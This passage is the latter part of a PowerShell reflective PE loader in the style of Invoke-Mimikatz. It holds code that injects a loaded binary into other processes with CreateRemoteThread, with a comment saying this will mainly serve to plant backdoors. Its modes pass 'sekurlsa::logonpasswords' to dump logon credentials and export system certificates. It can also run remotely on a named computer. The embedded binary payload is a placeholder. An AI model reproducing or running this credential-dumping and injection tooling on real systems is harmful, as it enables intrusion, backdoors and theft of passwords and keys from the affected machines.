                    $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
                    $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
                    if ($Result -ne 0) {
                        Throw 'Call to CreateRemoteThread to call GetProcAddress failed.'
                    }
                
                    $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
                }
            }
            elseif ($PEInfo.FileType -ieq 'EXE') {
                #Overwrite GetCommandLine and ExitProcess so we can provide our own arguments to the EXE and prevent it from killing the PS process
                [IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
                [System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
                $OverwrittenMemInfo = Update-ExeFunctions -PEInfo $PEInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

                #If this is an EXE, call the entry point in a new thread. We have overwritten the ExitProcess function to instead ExitThread
                #   This way the reflectively loaded EXE won't kill the powershell process when it exits, it will just kill its own thread.
                [IntPtr]$ExeMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
                Write-Verbose "Call EXE Main function. Address: $ExeMainPtr. Creating thread for the EXE to run in."

                $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

                while ($true) {
                    [Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
                    if ($ThreadDone -eq 1) {
                        Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32Functions $Win32Functions -Win32Constants $Win32Constants
                        Write-Verbose 'EXE thread has completed.'
                        break
                    }
                    else {
                        Start-Sleep -Seconds 1
                    }
                }
            }
        
            return @($PEInfo.PEHandle, $EffectivePEHandle)
        }
    
    
        Function Invoke-MemoryFreeLibrary {
            Param(
                [Parameter(Position = 0, Mandatory = $true)]
                [IntPtr]
                $PEHandle
            )
        
            #Get Win32 constants and functions
            $Win32Constants = Get-Win32Constants
            $Win32Functions = Get-Win32Functions
            $Win32Types = Get-Win32Types
        
            $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
            #Call FreeLibrary for all the imports of the DLL
            if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0) {
                [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
                while ($true) {
                    $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                    #If the structure is null, it signals that this is the end of the array
                    if ($ImportDescriptor.Characteristics -eq 0 `
                            -and $ImportDescriptor.FirstThunk -eq 0 `
                            -and $ImportDescriptor.ForwarderChain -eq 0 `
                            -and $ImportDescriptor.Name -eq 0 `
                            -and $ImportDescriptor.TimeDateStamp -eq 0) {
                        Write-Verbose 'Done unloading the libraries needed by the PE'
                        break
                    }

                    $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
                    $ImportDllHandle = $Win32Functions.GetModuleHandle.Invoke($ImportDllPath)

                    if ($ImportDllHandle -eq $null) {
                        Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
                    }
                
                    $Success = $Win32Functions.FreeLibrary.Invoke($ImportDllHandle)
                    if ($Success -eq $false) {
                        Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
                    }
                
                    $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
                }
            }
        
            #Call DllMain with process detach
            Write-Verbose 'Calling dllmain so the DLL knows it is being unloaded'
            $DllMainPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
            $DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
            $DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DllMainPtr, $DllMainDelegate)
        
            $DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
        
        
            $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
            if ($Success -eq $false) {
                Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
            }
        }


        Function Main {
            $Win32Functions = Get-Win32Functions
            $Win32Types = Get-Win32Types
            $Win32Constants = Get-Win32Constants
        
            $RemoteProcHandle = [IntPtr]::Zero
    
            #If a remote process to inject in to is specified, get a handle to it
            if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne '')) {
                Throw "Can't supply a ProcId and ProcName, choose one or the other"
            }
            elseif ($ProcName -ne $null -and $ProcName -ne '') {
                $Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
                if ($Processes.Count -eq 0) {
                    Throw "Can't find process $ProcName"
                }
                elseif ($Processes.Count -gt 1) {
                    $ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
                    Write-Output $ProcInfo
                    Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
                }
                else {
                    $ProcId = $Processes[0].ID
                }
            }
        
            #Just realized that PowerShell launches with SeDebugPrivilege for some reason.. So this isn't needed. Keeping it around just incase it is needed in the future.
            #If the script isn't running in the same Windows logon session as the target, get SeDebugPrivilege
            #       if ((Get-Process -Id $PID).SessionId -ne (Get-Process -Id $ProcId).SessionId)
            #       {
            #           Write-Verbose "Getting SeDebugPrivilege"
            #           Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
            #       }   
        
            if (($ProcId -ne $null) -and ($ProcId -ne 0)) {
                $RemoteProcHandle = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
                if ($RemoteProcHandle -eq [IntPtr]::Zero) {
                    Throw "Couldn't obtain the handle for process ID: $ProcId"
                }
            
                Write-Verbose 'Got the handle for the remote process to inject in to'
            }
        

            #Load the PE reflectively
            Write-Verbose 'Calling Invoke-MemoryLoadLibrary'

            try {
                $Processors = Get-WmiObject -Class Win32_Processor
            }
            catch {
                throw ($_.Exception)
            }

            if ($Processors -is [array]) {
                $Processor = $Processors[0]
            }
            else {
                $Processor = $Processors
            }

            if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size) * 8) ) {
                Write-Verbose ( 'Architecture: ' + $Processor.AddressWidth + ' Process: ' + ([System.IntPtr]::Size * 8))
                Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
            }

            #Determine whether or not to use 32bit or 64bit bytes
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8) {
                [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
            }
            else {
                [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
            }
            $PEBytes[0] = 0
            $PEBytes[1] = 0
            $PEHandle = [IntPtr]::Zero
            if ($RemoteProcHandle -eq [IntPtr]::Zero) {
                $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
            }
            else {
                $PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
            }
            if ($PELoadedInfo -eq [IntPtr]::Zero) {
                Throw 'Unable to load PE, handle returned is NULL'
            }
        
            $PEHandle = $PELoadedInfo[0]
            $RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
        
        
            #Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
            $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
            if (($PEInfo.FileType -ieq 'DLL') -and ($RemoteProcHandle -eq [IntPtr]::Zero)) {
                #########################################
                ### YOUR CODE GOES HERE
                #########################################
                Write-Verbose 'Calling function with WString return type'
                [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName 'powershell_reflective_Tool'
                if ($WStringFuncAddr -eq [IntPtr]::Zero) {
                    Throw "Couldn't find function address."
                }
                $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
                $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
                [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
                if ($OutputPtr -eq [IntPtr]::Zero) {
                    Throw 'Unable to get output, Output Ptr is NULL'
                }
                else {
                    $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
                    Write-Output $Output
                    $Win32Functions.LocalFree.Invoke($OutputPtr);
                }
                #########################################
                ### END OF YOUR CODE
                #########################################
            }
            #For remote DLL injection, call a void function which takes no parameters
            elseif (($PEInfo.FileType -ieq 'DLL') -and ($RemoteProcHandle -ne [IntPtr]::Zero)) {
                $VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName 'VoidFunc'
                if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero)) {
                    Throw "VoidFunc couldn't be found in the DLL"
                }
            
                $VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
                $VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
            
                #Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
                $RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
            }
        
            #Don't free a library if it is injected in a remote process
            if ($RemoteProcHandle -eq [IntPtr]::Zero) {
                Invoke-MemoryFreeLibrary -PEHandle $PEHandle
            }
            else {
                #Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
                $Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
                if ($Success -eq $false) {
                    Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
                }
            }
        
            Write-Verbose 'Done!'
        }

        Main
    }

    #Main function to either run the script locally or remotely
    Function Main {
        if (($PSCmdlet.MyInvocation.BoundParameters['Debug'] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters['Debug'].IsPresent) {
            $DebugPreference = 'Continue'
        }
    
        Write-Verbose "PowerShell ProcessID: $PID"
    

        if ($PsCmdlet.ParameterSetName -ieq 'DumpCreds') {
            $ExeArgs = 'sekurlsa::logonpasswords exit'
        }
        elseif ($PsCmdlet.ParameterSetName -ieq 'DumpCerts') {
            $ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
        }
        else {
            $ExeArgs = $Command
        }

        [System.IO.Directory]::SetCurrentDirectory($pwd)

        $PEBytes64 = '123'
        if ($ComputerName -eq $null -or $ComputerName -imatch '^\s*$') {
            Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, 'Void', 0, '', $ExeArgs)
        }
        else {
            Invoke-Command -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, 'Void', 0, '', $ExeArgs) -ComputerName $ComputerName
        }
    }


    $parts = $(whoami /user)[-1].split(' ')[1];
    $parts2 = $parts.split('-');
    $HostName = $([System.Net.Dns]::GetHostByName(($env:computerName)).HostName);
    $DomainSID = $parts2[0..($parts2.Count - 2)] -join '-';
    $results = Main;
    "Hostname: $HostName / $DomainSID";
    $results
}